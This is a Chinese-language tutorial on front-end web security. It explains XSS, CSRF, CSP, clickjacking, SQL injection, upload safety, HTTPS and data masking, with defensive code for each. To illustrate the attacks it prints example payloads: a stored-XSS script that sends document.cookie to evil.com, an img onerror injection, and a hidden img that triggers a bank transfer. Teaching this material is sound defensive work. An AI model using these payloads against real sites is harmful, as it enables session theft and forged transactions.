# 前端安全

> 级别：中级→高级

前端开发经常被贴上"不安全"的标签，但这不代表我们可以放弃安全思考。一个稍有不慎的输入框、一个漏配 `HttpOnly` 的 Cookie、一个裸奔的 CORS 配置，都可能成为攻击者打开你整个站点的钥匙。理解常见攻击的原理与防御手段，是前端工程师从"能用"走向"可靠"的关键一课。

这篇文章我们系统梳理前端最常遇到的攻击向量：XSS、CSRF、点击劫持、注入、上传等，并从原理讲到防御实践，附上可直接落地的代码示例。

## 一、XSS：跨站脚本攻击

### 1. 什么是 XSS

**XSS（Cross Site Scripting，跨站脚本攻击）** 指攻击者把恶意脚本注入到被信任的页面中，当其他用户访问时，浏览器在当前用户的**受信上下文**里执行这些脚本，从而窃取 Cookie、劫持会话、篡改页面等。

根据脚本注入与执行方式的不同，可分为三类：

| 类型 | 特点 | 典型触发点 |
| --- | --- | --- |
| **反射型 XSS**（非持久） | 恶意脚本存在于**请求 URL** 中，服务器渲染后立即反射回页面 | 搜索框、错误提示、URL 参数回显 |
| **存储型 XSS**（持久） | 恶意脚本被**持久化到服务端数据库**，所有访问该页面的用户都会中招 | 评论、留言、昵称、帖子 |
| **DOM 型 XSS** | 恶意脚本通过**前端 JS 操作 DOM** 时注入，不经过服务端 | `innerHTML`、`document.write`、`eval`、`location.hash` |

### 2. 反射型示例

```html
<!-- 服务器把 ?keyword=<script>... 直接拼进页面 -->
<form>
  <p>你搜索的是：<?php echo $_GET['keyword']; ?></p>
  <script>alert('恶意代码');</script>
</form>
```

### 3. 存储型示例（危害最大）

攻击者提交一条评论：

```html
<script>
  fetch('https://evil.com/steal?c=' + document.cookie);
</script>
```

服务端未过滤存库，此后**每个访问评论区的用户**都会把 Cookie 发给攻击者，形成横向蠕虫式传播。

### 4. DOM 型示例

```js
const name = new URLSearchParams(location.search).get("name");
// 危险：把不可信数据拼接进 HTML
document.getElementById("greet").innerHTML = "你好，" + name;
// 若 name = <img src=x onerror=alert(1)> 则触发弹窗
```

### 5. 防御手段

**① 输入校验 + 输出编码（转义）**

对用户输入进行严格校验（白名单优先），对要输出到 HTML/属性/JS/URL 的每个上下文做对应编码。

```js
function escapeHtml(str) {
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}
```

**② 始终使用安全的 DOM 操作 API**

```js
// 安全：textContent 不会被解析执行
el.textContent = userInput;

// 危险：innerHTML 会把标签当 HTML 解析
el.innerHTML = userInput;

// 需要渲染富文本时，务必用白名单过滤库（如 DOMPurify）
import DOMPurify from "dompurify";
el.innerHTML = DOMPurify.sanitize(richText);
```

**③ Cookie 加 `HttpOnly`：**即使 XSS 成功，JS 也读不到会话 Cookie。

```http
Set-Cookie: session=xxx; HttpOnly; SameSite=Lax; Secure
```

**④ CSP（内容安全策略）** 作为纵深防御，见下文第三节。

## 二、CSRF：跨站请求伪造

### 1. 什么是 CSRF

**CSRF（Cross-Site Request Forgery）** 利用的是浏览器"携带 Cookie 发请求"的机制：用户已登录某站点 A，此时在恶意站点 B 上发起一个指向 A 的请求，浏览器**自动带上 A 的 Cookie**，而服务端无法辨别该请求是否真的来自用户的本意，从而执行转账、改密等危险操作。

```html
<!-- 恶意站点 B 上的隐藏表单/img，会自动向 A 发请求 -->
<img src="https://bank.com/api/transfer?to=evil&amount=100000" />
```

### 2. 关键前提与层级

CSRF 危害程度取决于 Cookie 的 `SameSite` 设置与请求方法：

- 无 `SameSite` 限制 → 高危（GET/POST 都可能触发）。
- 现代浏览器默认 `SameSite=Lax` → **跨站 POST 不再自动带 Cookie**，天然抵挡大部分 CSRF。
- `SameSite=None` → 最危险，必须配合 Token 等额外校验。

### 3. CSRF Token 方案

服务端下发一个一次性随机 Token，客户端在**请求头或请求体**中携带它验证，攻击者的跨站请求拿不到该 Token 就被拦截。

```js
// 从服务端渲染或接口获取 token
const csrfToken = await fetch("/api/csrf-token").then((r) => r.text());

fetch("/api/transfer", {
  method: "POST",
  headers: { "X-CSRF-Token": csrfToken },
  body: JSON.stringify({ to: "bob", amount: 100 }),
});
```

### 4. 防御总结

| 防御手段 | 原理 |
| --- | --- |
| **SameSite Cookie** | 从根上阻断跨站请求自动携带 Cookie（首选） |
| **CSRF Token** | 验证请求里确有用户主动携带的随机凭证 |
| **双重 Cookie 校验** | 请求头带 Cookie 值 + 校验一致性（有局限，需谨慎） |
| **校验 Referer / Origin** | 确认请求来源站，辅助手段（可能被绕过/缺失） |
| **敏感操作二次验证** | 转账改密走验证码 / 二次确认 |

## 三、CSP：内容安全策略

**CSP（Content Security Policy）** 通过响应头或 `<meta>` 告诉浏览器"哪些来源的资源是被允许的"，是 XSS、数据注入、点击劫持等攻击的**强力纵深防御层**。

```http
Content-Security-Policy: default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self';
  frame-ancestors 'none';
```

各指令含义：

| 指令 | 控制内容 |
| --- | --- |
| `default-src` | 未特别指定的资源的默认来源 |
| `script-src` | 允许加载执行哪些脚本（`'self'`、白名单域名、`'nonce'`、`'hash'`） |
| `style-src` | 样式来源 |
| `img-src` | 图片来源（`data:` 内联图、`https:` 任意 https） |
| `connect-src` | `fetch`/`XHR`/`WebSocket` 等请求来源 |
| `frame-ancestors` | 允许哪些站点以 iframe 嵌入本页 → **直接防御点击劫持** |

内联脚本可用 **nonce（随机数）** 或 **hash** 方式放行，避免完全禁止导致功能可用性问题：

```html
<script nonce="aB3xY9zQwE">
  // 只有带该 nonce 的内联脚本会被执行
</script>
```

```http
Content-Security-Policy: script-src 'self' 'nonce-aB3xY9zQwE'
```

配合 CSP 上报，能及时发现真实攻击：

```http
Content-Security-Policy: ...; report-uri /csp-report
```

## 四、点击劫持

**点击劫持（Clickjacking）** 指攻击者用 iframe 把目标站点透明地覆盖在恶意页面上，诱导用户点击看似正常的按钮，实际点击的却是目标站点的敏感操作（如点赞、支付、授权）。

防御手段：

**① CSP `frame-ancestors`（现代首选）**

```http
Content-Security-Policy: frame-ancestors 'self'
```

**② `X-Frame-Options` 响应头**（老方案，兼容旧浏览器，功能与 `frame-ancestors` 部分重叠）

```http
X-Frame-Options: DENY        # 完全禁止被 iframe 嵌入
X-Frame-Options: SAMEORIGIN  # 同源可嵌入
```

**③ 前端防套壳（辅助，非可靠）**：检测 `window.top` 是否被外部 iframe 包裹，被包裹则置顶。

```js
if (window.top !== window.self) {
  // 被 iframe 嵌套，主动跳出或提示风险
  window.top.location = window.location.href;
}
```

## 五、SQL 注入：前端协助的那部分

SQL 注入本身是**服务端**必须修的漏洞，但前端可以为"减少攻击面"和"尽早发现"出一份力：

- **服务端必须用参数化查询 / 预编译语句**，禁止拼接 SQL 字符串；这是根治手段，前端无法替代。
- **前端职责**：输入校验（拦截明显恶意字符）、对返回错误做统一脱敏、将异常上报监控。

前端可做的输入预校验示例：

```js
// 白名单/长度/类型校验，拒绝明显危险输入
function isValidSearch(keyword) {
  if (typeof keyword !== "string" || keyword.length > 100) return false;
  // 服务端仍会做最终校验，前端只是第一道防线
  return /[;'"--]/.test(keyword) ? false : true;
}
```

> 关键提醒：**前端校验可以被绕过**，永远不能把安全托付给前端过滤，SQL 注入的根治一定在服务端的参数化查询上。

## 六、上传安全

用户上传文件是另一个高危入口（可能上传可执行脚本、超大文件、重名覆盖等）。前端应配合服务端做：

- **类型白名单 + 魔数校验**：不信任扩展名，校验文件真实内容（`magic bytes`）。
- **限制大小**：前端校验大小只是体验，服务端必须限流限大小。
- **重命名存储 + HttpOnly/下线**：上传的文件**不允许被当作脚本执行**，存到非 web 可执行目录并随机命名。
- **图片安全**：SVG 可能内嵌脚本，非必要时禁止上传 SVG；若需支持，做内容净化。

```js
// 前端初步限制类型与大小（配合 type 白名单）
function checkUpload(file) {
  const allowed = ["image/png", "image/jpeg", "image/webp"];
  if (!allowed.includes(file.type)) {
    alert("仅支持图片格式");
    return false;
  }
  if (file.size > 2 * 1024 * 1024) {
    alert("文件不能超过 2MB");
    return false;
  }
  return true;
}
```

## 七、HTTPS：安全传输的基石

**HTTPS = HTTP + TLS**，提供**机密性（加密）**、**完整性（防篡改）** 与**身份认证（防冒充）**。几乎上面所有依赖 `Secure` Cookie、CSP、Service Worker 的能力，都**要求必须在 HTTPS 下**。

- **证书**：由受信任的 CA（证书颁发机构）签发，浏览器据此验证服务器身份。
- **流量嗅探**：明文 HTTP 下，中间人可以读到密码、会话态；HTTPS 从根本上杜绝。
- **HSTS**：强制浏览器只走 HTTPS，防止被降级到 HTTP。

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

## 八、数据脱敏与输入校验

### 1. 数据脱敏

无论在前端展示还是上报日志，都应避免暴露敏感明文。典型手段：**打码 / 掩盖 / 部分脱敏**。

```js
function maskPhone(phone) {
  return String(phone).replace(/^(\d{3})\d{4}(\d{4})$/, "$1****$2");
}
function maskEmail(email) {
  return String(email).replace(/^(.)(.*)@/g, "$1***@");
}

maskPhone("13800138000"); // "138****8000"
maskEmail("zhangsan@x.com"); // "z***@x.com"
```

注意事项：
- **敏感信息最小化返回**：接口只应返回必要字段（如用户详情不必返回完整身份证）。
- **日志脱敏**：前端上报错误日志时，去掉 token/密码/Cookie。
- **存储脱敏**：涉及传输与存储的敏感字段（密码、密钥）不落明文，由服务端做哈希/加密。

### 2. 输入校验

前端校验的目标是**提升体验、尽早拦截明显错误**，但**不能作为安全边界**（可被绕过）。设计原则：

- **白名单优先**：能枚举的就用枚举/正则白名单，不用黑名单。
- **结合库**：复杂校验用 schema 校验库（如 `zod`、`joi`）。

```js
import { z } from "zod";

const LoginSchema = z.object({
  username: z.string().min(3).max(20),
  password: z.string().min(8).max(64),
});

const result = LoginSchema.safeParse({ username: "alice", password: "12345678" });
if (!result.success) {
  console.log(result.error.issues); // 展示给用户友好提示
}
```

## 小结：纵深防御模型

单一手段永远不够，前端安全应是一套**多层纵深防御**：

1. **传输层**：全站 HTTPS + HSTS。
2. **输入/输出**：输入白名单校验 + 输出上下文编码（防 XSS）。
3. **会话**：Cookie `HttpOnly` + `Secure` + `SameSite=Lax/Strict`（防 XSS 盗取 / CSRF）。
4. **策略层**：CSP（防御 XSS/点击劫持）、`X-Frame-Options` / `frame-ancestors`（防点击劫持）。
5. **服务端兜底**：参数化查询（防 SQL 注入）、上传白名单与魔数校验、接口鉴权与 Token 校验（防 CSRF）。
6. **监控与风控**：CSRF Token、验证码、骚扰检测、异常上报。

安全不是一个功能，而是贯穿开发全流程的意识。把这层防线内化为习惯，你的前端才真正"可靠"。
